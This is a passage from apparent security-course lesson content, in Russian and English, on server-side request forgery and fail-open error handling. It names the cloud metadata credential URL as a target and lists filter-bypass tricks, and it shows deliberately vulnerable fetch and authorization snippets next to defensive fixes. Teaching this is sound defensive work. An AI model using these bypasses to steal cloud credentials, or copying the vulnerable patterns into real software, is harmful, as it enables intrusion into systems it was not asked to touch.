http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role-name&gt;

→ AccessKeyId, SecretAccessKey, Token
→ aws s3 ls / ec2 / whatever the role allows

IMDSv2 mitigates some SSRF: requires PUT token header first.
Still enforce egress + app allowlists.</div>
<p>GCP/Azure имеют свои metadata endpoints и headers (Metadata-Flavor, etc.).</p>

<h3>4. Классификация SSRF</h3>
<ul>
<li><strong>Basic</strong> — response body возвращается атакующему (easy read).</li>
<li><strong>Blind</strong> — только timing/OAST DNS; body не виден.</li>
<li><strong>Semi-blind</strong> — error messages / status differ.</li>
</ul>

<h3>5. Обходы фильтров</h3>
<ul>
<li>IP encoding: decimal, octal, hex, IPv6 <code>[::ffff:127.0.0.1]</code>.</li>
<li>DNS rebinding / short TTL to 127.0.0.1 after allowlist check.</li>
<li>Open redirect on allowlisted domain → internal.</li>
<li>URL parsers inconsistency (browser vs JVM vs go net/url) — «confused deputy» parsing.</li>
<li>Alternate hostnames: <code>localtest.me</code>, <code>127.0.0.1.nip.io</code>.</li>
<li>Redirect http→file or weird schemes (зависит от клиента).</li>
</ul>

<h3>6. Где искать SSRF в продуктах</h3>
<ul>
<li>Webhook testers, «fetch URL preview», PDF renderers, image thumbnailers.</li>
<li>SSO/OIDC discovery URL, repository import by URL, CI runners <code>include: remote</code>.</li>
<li>Monitoring uptime checks, link expanders, oEmbed, antivirus cloud scanners.</li>
<li>Params: <code>url</code>, <code>uri</code>, <code>path</code>, <code>dest</code>, <code>webhook</code>, <code>feed</code>, <code>api</code>, <code>callback</code>.</li>
</ul>

<div class="ebox">// Vulnerable pattern
app.get('/fetch', async (req, res) => {
  const r = await fetch(req.query.url); // 💀
  res.send(await r.text());
});</div>

<h3>7. Защита SSRF</h3>
<ul>
<li><strong>Allowlist</strong> конечных доменов (лучший default для webhooks).</li>
<li>Если URL произвольный — парсь, resolve DNS, <strong>block private/link-local/metadata</strong> ranges, потом connect; re-check after redirect; disable redirects ideally.</li>
<li>Фиксированный egress proxy с ACL; IMDSv2 + hop limit; no host network in K8s for such workers.</li>
<li>Network segmentation: app tier cannot reach IMDS or only via IMDSv2.</li>
<li>Не возвращай raw body внутренних ответов клиенту без нужды.</li>
</ul>
<div class="ebox">const ALLOW = new Set(['hooks.slack.com', 'api.partner.example']);
function safeFetch(raw) {
  const u = new URL(raw);
  if (!ALLOW.has(u.hostname)) throw new Error('blocked');
  if (u.protocol !== 'https:') throw new Error('https only');
  return fetch(u, { redirect: 'error', signal: AbortSignal.timeout(3000) });
}</div>

<h3>8. Mishandling exceptional conditions (2025 A10)</h3>
<p>Когда система ошибается, она должна <strong>fail-closed</strong> для security decisions:</p>
<ul>
<li>Auth service timeout → deny, not allow.</li>
<li>Policy engine error → deny.</li>
<li>Certificate validation error → abort TLS, don't continue plaintext.</li>
<li>Catch-all <code>except: pass</code> swallowing authz errors.</li>
<li>Default-open feature flags on error.</li>
<li>Verbose exception to client (пересечение с A05) + continue processing.</li>
</ul>
<div class="ebox">// Fail-open anti-pattern
try {
  if (!await authz.allow(user, resource)) return 403;
} catch (e) {
  log(e);
  // continues as allowed 💀
}
doPrivileged();</div>
<p>В lab кнопка «Fail-open error» показывает 200 + debug stack при недоступном URL — учебный stand-in dangerous error handling.</p>

<h3>9. Реальные инциденты SSRF</h3>
<ul>
<li><code>CVE-2021-26855</code> ProxyLogon — Exchange SSRF chain → RCE, mass exploitation.</li>
<li>Capital One 2019 — SSRF to IMDS + excessive IAM → S3 exfil ~100M records.</li>
<li><code>CVE-2021-40438</code> Apache mod_proxy SSRF.</li>
<li>Множество bug bounty: webhook SSRF → cloud keys / internal admin.</li>
</ul>

<h3>10. Как тестировать</h3>
<ul>
<li>Burp Collaborator / interactsh / oast для blind.</li>
<li>Internal IP wordlist + schemes.</li>
<li>Redirect chains; DNS rebinding tools (in lab environments).</li>
<li>Compare responses for 169.254.169.254 vs public URL.</li>
<li>Fault injection: kill dependency → does authz fail open?</li>
</ul>

<h3>11. Чеклист</h3>
<ul>
<li>Allowlist or hardened URL validator + IP block after resolve.</li>
<li>No redirects or re-validate each hop.</li>
<li>IMDSv2, egress controls, segmentation.</li>
<li>Fail-closed security decisions; generic client errors.</li>
<li>Don't reflect internal HTTP bodies to users.</li>
</ul>

<h3>12. Лаборатория</h3>
<p>Webhook fetcher: сходи в IMDS security-credentials → flag. Отдельно попробуй fail-open URL. Fix: allowlist + private IP deny + fail-closed.</p>

<h3>13. Чтение</h3>
<p>PortSwigger SSRF labs · OWASP SSRF Prevention Cheat Sheet · AWS IMDSv2 docs · OWASP Top 10:2025 A10 exceptional conditions · Capital One breach analyses.</p>
`, `
<h3>1. Two “A10”s</h3>
<p><strong>2021 A10 = SSRF</strong>. <strong>2025 A10 = Mishandling of Exceptional Conditions</strong> (fail-open, swallowed errors, unsafe defaults on failure). SSRF remains critical; RØOT combines both.</p>

<h3>2. SSRF threat model</h3>
<p>User-controlled URL makes the server request internal/metadata targets with its network/IAM power.</p>

<h3>3. Cloud metadata jackpot</h3>
<div class="ebox">http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE
→ temporary cloud credentials
Prefer IMDSv2 + egress restrictions + app allowlists</div>

<h3>4. SSRF classes</h3>
<p>Basic (body returned), blind (OAST/timing), semi-blind (status/errors).</p>

<h3>5. Filter bypasses</h3>
<p>IP encodings, DNS rebinding, open redirects, parser differentials, alternate hostnames, weird schemes.</p>

<h3>6. Common features</h3>
<p>Webhooks, previews, PDF/image renderers, repo import by URL, uptime checks, oEmbed — params like url/webhook/callback.</p>

<h3>7. SSRF defenses</h3>
<p>Allowlists, resolve-then-block private ranges, disable/recheck redirects, egress proxy, IMDSv2, don't return raw internal bodies.</p>

<h3>8. Exceptional conditions (2025)</h3>
<p>Security decisions must fail-closed on timeouts/errors. No “catch and allow”. No continue-after-cert-failure. No silent authz exceptions.</p>
<div class="ebox">try { if (!await allow()) return 403; }
catch { /* continue */ } // fail-open 💀
doPrivileged();</div>

<h3>9. Incidents</h3>
<p>ProxyLogon · Capital One · mod_proxy SSRF · bounty webhook→IMDS cases.</p>

<h3>10. Testing</h3>
<p>OAST, internal IP lists, redirect chains, fault injection for fail-open authz.</p>

<h3>11. Checklist</h3>
<p>Allowlist or hardened validator · no open redirects · cloud metadata hardening · fail-closed · generic errors.</p>

<h3>12. Lab</h3>
<p>Fetch IMDS credentials for the flag; try fail-open path; study Fix patterns.</p>

<h3>13. Reading</h3>
<p>PortSwigger SSRF · OWASP SSRF cheat sheet · IMDSv2 · OWASP 2025 A10 · Capital One analyses.</p>
`),

  };
})();
